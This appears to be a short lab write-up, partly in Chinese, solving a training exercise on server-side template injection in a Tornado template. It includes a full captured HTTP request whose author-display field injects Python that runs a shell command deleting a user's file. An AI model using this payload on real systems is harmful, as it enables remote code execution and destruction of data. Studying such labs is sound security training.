# Lab: Basic server-side template injection (code context)

This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

## SSTI
* 題目說是 Tornado template injection，稍微找一下可以知道相關的 pattern，又提示 preferred name 有問題，用 burp 稍微改一下 post 的內容並且瀏覽任意文章，並且留言，可以觀察到名字的變化，因此得知存在問題
```
POST /my-account/change-blog-post-author-display HTTP/1.1
Host: ac0f1f501f20ed15c014678b00c40027.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5 (Ergänzendes Update)) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Origin: https://ac0f1f501f20ed15c014678b00c40027.web-security-academy.net
Connection: close
Referer: https://ac0f1f501f20ed15c014678b00c40027.web-security-academy.net/my-account
Cookie: session=6GDUacSqiRhgPv35mH4inDQ7RX1bZwag
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-Forwarded-For: 127.0.0.1

blog-post-author-display=__import__("os").system("rm /home/carlos/morale.txt")&csrf=cetkEwQ44Z81FTKm2Cpc1NWeUE6Vu8aY
```